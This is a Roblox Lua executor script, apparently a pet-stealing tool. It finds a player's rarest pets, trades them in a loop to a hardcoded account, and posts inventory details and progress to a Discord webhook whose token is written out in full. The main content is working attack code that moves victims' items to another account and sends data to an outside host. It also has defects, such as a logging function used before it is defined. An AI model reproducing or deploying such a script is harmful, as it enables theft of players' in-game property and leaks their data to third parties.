local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Load configuration
local config = getgenv().PetTraderConfig or {
    TARGET_PLAYER = "Dunjenkwestpro",
    WEBHOOK_URL = "https://discord.com/api/webhooks/1411629941178765365/k0Tw3CWiuZ935oPnQ4GnofN3xcWAc7q3KWg41_SwqtkOlyNotA5nNXzPjf1XVg1zcu4h",
    KICK_MODE = false,
    CYCLE_DELAY = 80,
    JOB_IDS = {"05de8e8f-e950-4f9d-a235-2ac70036ee69"}
}

local TARGET_PLAYER = config.TARGET_PLAYER
local WEBHOOK_URL = config.WEBHOOK_URL
local KICK_MODE = config.KICK_MODE
local CYCLE_DELAY = config.CYCLE_DELAY
local JOB_IDS = config.JOB_IDS

local Network = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteEvent")
local LocalData = require(ReplicatedStorage.Client.Framework.Services.LocalData)
local PetsModule = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Data"):WaitForChild("Pets"))

local function joinJobId(jobId)
    if not jobId or jobId == "" then
        return false
    end
    
    if game.JobId == jobId then
        return true
    end
    
    local success, result = pcall(function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, Players.LocalPlayer)
    end)
    
    if success then
        sendToDiscord("Joined specific server: " .. jobId)
        return true
    end
    
    return false
end

local function checkAndJoinJob()
    if JOB_IDS and #JOB_IDS > 0 then
        for _, jobId in ipairs(JOB_IDS) do
            if joinJobId(jobId) then
                return true
            end
        end
        sendToDiscord("Failed to join any specified Job IDs, using random server")
    end
    return false
end

local function sendToDiscord(message)
    local payload = HttpService:JSONEncode({content = message})
    local req = (request or http_request or syn and syn.request)
    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end
end

local function rejoinGame()
    if KICK_MODE then
        Players.LocalPlayer:Kick("Trade completed")
        return
    end
    
    if not checkAndJoinJob() then
        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        sendToDiscord("Joining random server")
    end
end

local function findTargetPets()
    local targetPets = {}
    for petName, petInfo in pairs(PetsModule) do
        if petInfo.Rarity == "Secret" or petInfo.Rarity == "Infinity" then
            targetPets[petName] = petInfo
        end
    end
    
    local data = LocalData:Get()
    if not data or not data.Pets then
        return {}
    end
    
    local foundPets = {}
    for _, pet in pairs(data.Pets) do
        if targetPets[pet.Name] then
            local displayName = ""
            if pet.Shiny then displayName = displayName .. "Shiny " end
            if pet.Mythic then displayName = displayName .. "Mythic " end
            displayName = displayName .. pet.Name
            
            table.insert(foundPets, {
                id = pet.Id,
                name = displayName,
                rarity = targetPets[pet.Name].Rarity
            })
        end
    end
    
    return foundPets
end

local function isTradeActive()
    return true
end

local function formatPetId(petId)
    local idString = tostring(petId)
    if not idString:match(":") then
        return idString .. ":0"
    end
    return idString
end

local function declineTradeAndStop()
    sendToDiscord("No Secret/Infinity pets left. Declining trade and stopping automation.")
    
    local args = {"TradeDecline"}
    Network:FireServer(unpack(args))
    
    sendToDiscord("Automation stopped completely. No more pets to trade.")
    
    while true do
        wait(3600)
    end
end

local function performTrade()
    sendToDiscord("Starting trade cycle with " .. TARGET_PLAYER)
    
    local targetPlayer = Players:WaitForChild(TARGET_PLAYER)
    if not targetPlayer then
        sendToDiscord("Target player not found: " .. TARGET_PLAYER)
        rejoinGame()
        return false
    end
    
    local args = {"TradeRequest", targetPlayer}
    Network:FireServer(unpack(args))
    sendToDiscord("Trade request sent to " .. TARGET_PLAYER)
    
    for i = 1, 10 do
        wait(1)
        if not isTradeActive() then
            sendToDiscord("Trade was cancelled during waiting period")
            return false
        end
    end
    
    sendToDiscord("Scanning for Secret/Infinity pets...")
    local targetPets = findTargetPets()
    
    if #targetPets == 0 then
        declineTradeAndStop()
        return false
    end
    
    local petList = "Found " .. #targetPets .. " Secret/Infinity pets:"
    for i, pet in ipairs(targetPets) do
        petList = petList .. string.format("%d. %s | ID: %s | Rarity: %s", i, pet.name, pet.id, pet.rarity)
    end
    sendToDiscord(petList)
    
    local petsToAdd = math.min(10, #targetPets)
    sendToDiscord("Adding " .. petsToAdd .. " pets to trade...")
    
    for i = 1, petsToAdd do
        if not isTradeActive() then
            sendToDiscord("Trade was cancelled while adding pets")
            return false
        end
        
        local pet = targetPets[i]
        local formattedPetId = formatPetId(pet.id)
        local args = {"TradeAddPet", formattedPetId}
        Network:FireServer(unpack(args))
        sendToDiscord(pet.name .. " added (ID: " .. formattedPetId .. ")")
        wait(1)
    end
    
    wait(5)
    if not isTradeActive() then
        sendToDiscord("Trade was cancelled before acceptance")
        return false
    end
    
    local args = {"TradeAccept"}
    Network:FireServer(unpack(args))
    sendToDiscord("Trade accept")
    
    wait(15)
    if not isTradeActive() then
        sendToDiscord("Trade was cancelled before confirmation")
        return false
    end
    
    local args = {"TradeConfirm"}
    Network:FireServer(unpack(args))
    sendToDiscord("Trade confirmed")
    
    sendToDiscord("Trading again in " .. CYCLE_DELAY .. " seconds...")
    wait(CYCLE_DELAY)
    return true
end

-- Initial server join check
if not checkAndJoinJob() then
    sendToDiscord("Starting in current server")
end

sendToDiscord("Pet trading automation started")
while true do
    local success, err = pcall(performTrade)
    if not success then
        sendToDiscord("Error in trade cycle: " .. tostring(err))
        rejoinGame()
        wait(CYCLE_DELAY)
    end
end
